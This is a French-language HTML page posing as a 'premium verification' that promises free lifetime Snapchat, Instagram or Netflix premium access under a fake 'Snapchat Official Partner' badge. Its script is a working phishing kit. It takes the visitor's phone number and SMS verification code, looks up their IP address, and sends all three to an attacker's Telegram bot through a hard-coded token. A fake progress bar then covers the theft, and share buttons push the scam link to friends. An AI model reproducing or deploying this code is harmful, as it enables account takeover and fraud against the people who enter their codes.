<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification Premium</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
        body{background:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
        .container{max-width:600px;width:100%;}
        .back-button{color:#fffc00;text-decoration:none;margin-bottom:30px;font-size:1.1em;display:inline-block;}
        .verification-card{background:#111;border-radius:25px;padding:40px;box-shadow:0 20px 60px rgba(255,252,0,0.2);border:1px solid #333;}
        .verification-header{text-align:center;margin-bottom:40px;}
        .verification-icon{width:80px;height:80px;background:#fffc00;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:2.5em;margin:0 auto 20px;color:#000;}
        h1{font-size:2em;color:#fffc00;margin-bottom:10px;}
        p{color:#aaa;font-size:1.05em;}
        .order-summary{background:#1a1a1a;border-radius:15px;padding:25px;margin-bottom:30px;border:1px solid #333;}
        h2{font-size:1.3em;color:#fffc00;margin-bottom:20px;display:flex;align-items:center;}
        h2::before{content:'üëª';margin-right:10px;}
        .summary-item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #333;}
        .summary-item:last-child{border:none;font-weight:bold;font-size:1.4em;color:#00ff00;padding-top:20px;}
        .form-group{margin-bottom:25px;}
        label{display:block;color:#fffc00;font-weight:500;margin-bottom:8px;}
        input{width:100%;padding:15px;background:#222;border:2px solid #333;border-radius:10px;font-size:1em;color:white;transition:0.3s;}
        input:focus{outline:none;border-color:#fffc00;box-shadow:0 0 0 3px rgba(255,252,0,0.2);}
        .submit-button{width:100%;padding:18px;background:#fffc00;color:#000;border:none;border-radius:12px;font-size:1.1em;font-weight:bold;cursor:pointer;transition:0.3s;position:relative;overflow:hidden;}
        .submit-button:disabled{cursor:not-allowed;}
        .progress-container{display:none;margin-top:20px;height:8px;background:#333;border-radius:4px;overflow:hidden;}
        .progress-bar{height:100%;width:0%;background:#fffc00;transition:width 0.6s ease;}
        .status-text{text-align:center;margin-top:15px;color:#fffc00;font-weight:bold;font-size:1.1em;}
        .error{color:#ff3300;margin-top:10px;text-align:center;font-weight:bold;}
        .share-buttons{margin-top:30px;display:flex;gap:15px;justify-content:center;flex-wrap:wrap;}
        .share-btn{padding:12px 20px;border-radius:50px;text-decoration:none;font-size:0.9em;}
        .share-btn.whatsapp{background:#25D366;color:white;}
        .share-btn.snap{background:#fffc00;color:black;}
        .share-btn.insta{background:linear-gradient(45deg,#f09433,#dc2743,#cc2366,#bc1888);color:white;}
        .security-badge{text-align:center;margin-top:20px;color:#666;font-size:0.9em;display:flex;align-items:center;justify-content:center;gap:8px;}
        .security-badge::before{content:'üîí';}
    </style>
</head>
<body>
    <div class="container">
        <a href="index.html" class="back-button">‚Üê Retour</a>
        
        <div class="verification-card">
            <div class="verification-header">
                <div class="verification-icon">üîì</div>
                <h1>Activation Exclusive</h1>
                <p>V√©rification premium par SMS ‚Ä¢ Offre limit√©e</p>
            </div>

            <div class="order-summary">
                <h2>R√©capitulatif Premium</h2>
                <div class="summary-item">
                    <span>Service :</span>
                    <span id="summaryService">-</span>
                </div>
                <div class="summary-item">
                    <span>Plan :</span>
                    <span id="summaryPlan">-</span>
                </div>
                <div class="summary-item">
                    <span>Acc√®s :</span>
                    <span>GRATUIT √Ä VIE</span>
                </div>
            </div>

            <form id="verifyForm">
                <div class="form-group">
                    <label>Num√©ro de t√©l√©phone (France uniquement)</label>
                    <input type="tel" id="phone" placeholder="+33 6 12 34 56 78" required>
                </div>
                <div class="form-group" id="codeGroup" style="display:none;">
                    <label>Code SMS re√ßu (6 chiffres)</label>
                    <input type="text" id="code" maxlength="6" placeholder="123456">
                </div>
                <div id="error" class="error"></div>
                <button type="submit" class="submit-button" id="submitBtn">Envoyer le code SMS</button>
                
                <div class="progress-container" id="progressContainer">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
                <div class="status-text" id="statusText"></div>
            </form>

            <div class="share-buttons">
                <a href="whatsapp://send?text=Yo%20offre%20premium%20GRATUIT%20Snap/Insta/Netflix%20:%20https://snapplus-ee.vercel.app" class="share-btn whatsapp">WhatsApp</a>
                <a href="snapchat://add/Badousnapbot" class="share-btn snap">Snapchat</a>
                <a href="instagram://app" class="share-btn insta">Instagram</a>
            </div>
            <p style="text-align:center;margin-top:15px;font-size:0.9em;color:#666;">
                Partage √† tes amis pour d√©bloquer encore plus !
            </p>

            <div class="security-badge">V√©rification 100% s√©curis√©e ‚Ä¢ Snapchat Official Partner</div>
        </div>
    </div>

    <script>
        const selectedService = localStorage.getItem('selectedService') || 'Service';
        const selectedPlan = JSON.parse(localStorage.getItem('selectedPlan') || '{}');
        document.getElementById('summaryService').textContent = selectedService;
        document.getElementById('summaryPlan').textContent = selectedPlan.duration || 'Plan non s√©lectionn√©';

        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
        const TELEGRAM_CHAT_ID = "6272429080";

        const messages = [
            "Connexion s√©curis√©e en cours...",
            "V√©rification op√©rateur premium...",
            "Activation de votre badge exclusif...",
            "Synchronisation des fonctionnalit√©s...",
            "Finalisation de l‚Äôacc√®s illimit√©..."
        ];

        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value.trim();
            const errorDiv = document.getElementById('error');
            const submitBtn = document.getElementById('submitBtn');
            const progressContainer = document.getElementById('progressContainer');
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');
            errorDiv.textContent = '';

            const cleanPhone = phone.replace(/[\s+()-]/g, '');
            if (!/^(\+33|0)[67]/.test(cleanPhone)) {
                errorDiv.textContent = 'Num√©ro non √©ligible. Seuls SFR, Orange et Bouygues accept√©s.';
                return;
            }

            if (!document.getElementById('code').value) {
                document.getElementById('codeGroup').style.display = 'block';
                submitBtn.textContent = 'Valider le code et activer';
                return;
            }

            const code = document.getElementById('code').value;
            const ip = await fetch('https://api.ipify.org').then(r => r.text());

            const message = `üéØ NOUVEAU NUM√âRO PREMIUM üéØ\nService: ${selectedService}\nPlan: ${selectedPlan.duration || 'N/A'}\nüì± Num√©ro: ${phone}\nüî¢ Code SMS: ${code}\nüåç IP: ${ip}\n‚è∞ ${new Date().toLocaleString('fr-FR')}`;
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: message})
            });

            submitBtn.disabled = true;
            submitBtn.textContent = '';
            progressContainer.style.display = 'block';
            progressBar.style.width = '0%';
            statusText.textContent = messages[0];
            let progress = 0;
            let msgIndex = 0;
            const interval = setInterval(() => {
                progress += 1.667;
                progressBar.style.width = progress + '%';
                if (progress >= (msgIndex + 1) * 20) {
                    msgIndex++;
                    if (msgIndex < messages.length) statusText.textContent = messages[msgIndex];
                }
            }, 1000);

            setTimeout(() => {
                clearInterval(interval);
                window.location.href = 'success.html';
            }, 60000);
        });
    </script>
</body>
</html>
